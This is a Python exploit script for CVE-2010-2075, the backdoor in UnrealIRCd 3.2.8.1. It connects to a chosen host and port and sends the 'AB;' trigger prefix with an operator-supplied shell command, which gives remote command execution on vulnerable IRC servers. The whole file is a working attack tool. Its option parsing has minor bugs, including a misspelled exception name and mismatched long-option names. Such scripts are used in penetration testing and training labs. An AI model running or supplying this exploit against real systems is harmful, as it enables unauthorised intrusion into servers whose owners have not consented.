# CVE-2010-2075 - Backdoor in UnrealIRCd 3.2.8.1

import getopt
import sys
import socket


BACKDOOR_PREFIX = 'AB;'


def usage():
    print('CVE-2010-2075 - UnrealIRC Backdoor')
    print()
    print('Flags:')
    print('{} - Target Host'.format('\t-t --target'.ljust(20,' ')))
    print('{} - Target Port'.format('\t-p --port'.ljust(20,' ')))
    print('{} - Command to execute'.format('\t-c --cmd'.ljust(20,' ')))
    print()


def main():
    try:
        opts,args = getopt.getopt(sys.argv[1:], 't:p:c:', ['target','port','cmd'])
    except getopt.GetopError as e:
        print(str(e))
        usage()
        sys.exit(1)
    target = None
    port = None
    cmd = None
    for o,a in opts:
        if o in ('-t','--target'):
            target = a
        elif o in ('-p','--port'):
            try:
                port = int(a)
            except ValueError:
                usage()
                sys.exit(1)
        elif o in ('-c','--command'):
            cmd = a
        else:
            print('[!] Invalid option {} with value: {}'.format(o,a))
            usage()
            sys.exit(1)
        
    missing_param = False

    if target is None:
        print('[!] Must provide target')
        missing_param = True

    if port is None:
        print('[!] Must provide port')
        missing_param = True

    if cmd is None:
        print('[!] Must provide command to execute')
        missing_param = True

    if missing_param:
        usage()
        sys.exit(1)

    print('[+] Setting up exploit')

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            
        payload = '{} {}'.format(BACKDOOR_PREFIX, cmd)
        s.connect((target,port))
        msg = s.recv(1024).decode()
        print('[+] Received {}'.format(msg))
        s.send(payload.encode())
        print('[+] Payload sent, command may take a few seconds to execute')


if __name__ == '__main__':
    main()
